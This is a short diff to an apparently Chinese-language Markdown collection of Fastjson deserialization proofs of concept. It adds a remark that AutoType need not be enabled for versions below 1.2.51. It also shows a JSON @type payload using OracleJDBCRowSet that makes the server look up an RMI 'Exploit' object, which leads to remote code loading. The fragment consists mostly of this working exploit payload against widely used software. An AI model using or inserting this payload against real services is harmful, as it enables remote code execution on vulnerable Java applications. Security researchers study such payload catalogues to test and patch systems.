@@ -485,6 +485,9 @@ poc:
 **1.2.48之后版本，比较困难**
 
 ### Fastjson < 1.2.51
+
+**不需要开启AutoType**
+
 ```
 {"@type":"java.lang.AutoCloseable","@type":"oracle.jdbc.rowset.OracleJDBCRowSet","dataSourceName":"rmi://127.0.0.1:2333/Exploit","command":"a"}
 ```
